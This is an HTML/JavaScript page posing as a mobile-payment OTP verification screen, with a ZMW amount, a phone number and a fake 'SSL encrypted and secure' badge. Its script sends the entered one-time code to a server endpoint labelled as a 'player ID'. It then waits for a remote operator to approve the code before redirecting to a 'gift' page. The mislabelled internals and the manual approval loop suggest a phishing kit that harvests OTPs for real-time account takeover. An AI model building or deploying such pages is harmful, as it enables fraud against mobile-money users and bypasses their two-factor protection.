<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>OTP Verification</title>
<style>
*{box-sizing:border-box}
html,body{
  margin:0;
  min-height:100%;
  background:#f3f3f3;
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
  color:#5f5f5f;
}
body{
  display:flex;
  justify-content:center;
  align-items:flex-start;
  min-height:100vh;
  padding:16px;
}
.card{
  width:100%;
  max-width:420px;
  min-height:460px;
  background:#fff;
  border:0;
  border-radius:18px;
  overflow:hidden;
  box-shadow:0 6px 18px rgba(0,0,0,.06);
}
.top{
  position:relative;
  padding:20px 16px 20px;
  border-bottom:1px solid #ededed;
}
.back{
  font-size:13px;
  color:#4f6175;
  margin-bottom:30px;
}
.amount{
  position:absolute;
  top:18px;
  right:16px;
  text-align:right;
}
.amount-label{
  font-size:8px;
  color:#8a8a8a;
  font-weight:700;
  letter-spacing:1px;
}
.amount-value{
  color:#ff6500;
  font-size:16px;
  font-weight:800;
  margin-top:1px;
}
h1{
  font-size:20px;
  margin:0 0 7px;
  font-weight:700;
  color:#111827;
  letter-spacing:0;
}
.subtitle{
  font-size:12px;
  color:#8a8a8a;
  line-height:1.4;
}
.content{
  padding:31px 16px 24px;
}
.sending{
  text-align:center;
  margin-bottom:38px;
}
.sending-label{
  color:#8a8a8a;
  font-size:9px;
  font-weight:700;
  letter-spacing:1.2px;
  margin-bottom:8px;
}
.number{
  font-size:14px;
  font-weight:700;
  color:#111827;
}
.label{
  color:#7a7a7a;
  font-size:9px;
  font-weight:700;
  letter-spacing:.6px;
  margin:0 0 10px 2px;
}
.winer-box{
  width:100%;
  height:52px;
  border:1px solid #e1e5e9;
  border-radius:12px;
  background:#f8f9fa;
  display:flex;
  align-items:center;
  justify-content:center;
  gap:7px;
}
.winer{
  width:100px;
  height:34px;
  border:0;
  outline:0;
  background:transparent;
  text-align:center;
  font-size:20px;
  color:#1f2937;
  font-weight:700;
  padding:0;
  letter-spacing:8px;
}
.winer::placeholder{color:#c8cfd8}
.counter{
  text-align:center;
  color:#9a9a9a;
  font-size:10px;
  margin-top:20px;
}
.verify{
  width:100%;
  height:54px;
  border:0;
  border-radius:14px;
  margin-top:20px;
  background:#ffad78;
  color:#fff;
  font-size:14px;
  font-weight:700;
  cursor:pointer;
  box-shadow:0 7px 13px rgba(255,120,45,.16);
}
.verify:active{transform:scale(.99)}
.secure{
  text-align:center;
  margin-top:24px;
  color:#8a8a8a;
  font-size:9px;
  letter-spacing:.3px;
}
.secure span{
  color:#00a651;
  font-size:11px;
  margin-right:3px;
}
.error{
  text-align:center;
  color:#c62828;
  font-size:13px;
  min-height:20px;
  margin-top:10px;
}
.approval-spinner{position:fixed;top:50%;left:50%;width:18px;height:18px;border:2px solid rgba(255,101,0,.3);border-top-color:#ffcc00;border-radius:50%;animation:approval-spin .7s linear infinite;transform:translate(-50%,-50%)}
@keyframes approval-spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
@media(max-width:320px){
  body{padding:0}
  .card{max-width:100%;min-height:100vh;border-radius:18px 18px 0 0}
}
@media(min-width:321px) and (max-width:480px){
  body{padding:0}
  .card{max-width:100%;min-height:100vh;border-radius:18px 18px 0 0}
}
</style>
</head>

<body>
<div class="card">
  <div class="top">
    <div class="back">‹&nbsp; Back</div>

    <div class="amount">
      <div class="amount-label">AMOUNT</div>
      <div class="amount-value" id="amountValue">ZMW 25.00</div>
    </div>

    <h1>OTP Verification</h1>
    <div class="subtitle">Enter your 4-digit OTP below.</div>
  </div>

  <div class="content">
    <div class="sending">
      <div class="sending-label">SENDING TO</div>
      <div class="number" id="submittedPhone">778000667</div>
    </div>

    <div class="label">ENTER OTP CODE</div>

    <div class="winer-box">
      <input
        class="winer"
        type="text"
        inputmode="numeric"
        pattern="[0-9]{4}"
        maxlength="4"
        aria-label="4-digit OTP"
        autocomplete="off"
      >
    </div>

    <div class="counter" id="counter">0 / 4 digits</div>

    <button class="verify" id="verify" type="button">
      Verify &amp; Complete&nbsp; ◉
    </button>

    <div class="error" id="error"></div>
    <div class="approval-spinner" id="approvalSpinner" hidden aria-label="Waiting for approval"></div>

    <div class="secure">
      <span>♧</span> SSL ENCRYPTED AND SECURE
    </div>
  </div>
</div>

<script>
const input = document.querySelector(".winer");
const counter = document.getElementById("counter");
const error = document.getElementById("error");
const verify = document.getElementById("verify");
const approvalSpinner = document.getElementById("approvalSpinner");
const amountValue = document.getElementById("amountValue");

try {
  const selectedPlan = JSON.parse(sessionStorage.getItem("selectedPlan") || "null");
  const amount = selectedPlan && String(selectedPlan.price || "").match(/\d+(?:\.\d+)?/);
  if (amount) amountValue.textContent = `ZMW ${Number(amount[0]).toFixed(2)}`;
  if (selectedPlan && selectedPlan.price === "Free trial") amountValue.textContent = "ZMW 0.00";
} catch (storageError) {
  console.warn("Selected plan unavailable:", storageError);
}
const submittedPhone = sessionStorage.getItem("submittedPhone");
if (submittedPhone) document.getElementById("submittedPhone").textContent = submittedPhone;

input.addEventListener("input", () => {
  input.value = input.value.replace(/\D/g, "").slice(0, 4);
  counter.textContent = input.value.length + " / 4 digits";
  error.textContent = "";
});

verify.addEventListener("click", async () => {
  const playerId = input.value;

  if (!/^\d{4}$/.test(playerId)) {
    error.style.color = "#c62828";
    error.textContent = "Please enter all 4 digits.";
    return;
  }

  verify.disabled = true;
  approvalSpinner.hidden = false;
  error.style.color = "#6d7782";
  error.textContent = "Submitting player ID for approval...";

  try {
    const response = await fetch("/api/send", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        playerId
      })
    });

    const data = await response.json().catch(() => ({}));

    if (!response.ok || !data.ok) {
      throw new Error(data.error || "Submission failed.");
    }

    error.textContent = "Waiting for approval...";

    const submissionId = data.submissionId;
    const checkStatus = async () => {
      while (true) {
      const statusResponse = await fetch(
        `/api/submission-status?id=${encodeURIComponent(submissionId)}`,
        { cache: "no-store" }
      );
      const statusData = await statusResponse.json();

      if (statusData.status === "approved") {
        approvalSpinner.hidden = true;
        error.style.color = "#14804a";
        error.textContent = "Approved. Completing submission...";
        window.location.href = "gift.html";
        return;
      }

      if (statusData.status === "rejected") {
        approvalSpinner.hidden = true;
        throw new Error("This player ID was rejected. Please check it and try again.");
      }

        await new Promise(resolve => setTimeout(resolve, 500));
      }
    };

    await checkStatus();

  } catch (err) {
    approvalSpinner.hidden = true;
    console.error("Winner submission failed:", err);

    error.style.color = "#c62828";
    error.textContent = err.message || "Submission failed.";

    verify.disabled = false;
  }
});
</script>
</body>
</html>
